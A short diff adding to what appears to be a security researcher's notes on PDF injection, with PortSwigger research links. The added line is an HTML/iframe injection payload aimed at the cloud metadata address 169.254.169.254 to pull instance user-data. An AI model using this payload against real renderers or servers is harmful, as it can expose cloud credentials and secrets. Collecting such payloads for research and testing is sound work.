@@ -7,3 +7,6 @@ Link https://portswigger.net/daily-swig/xss-for-pdfs-new-injection-technique-off
 More in detail.
 
 https://portswigger.net/research/portable-data-exfiltration
+
+
+ <style><iframe src=”http://169.254.169.254/user-data”>
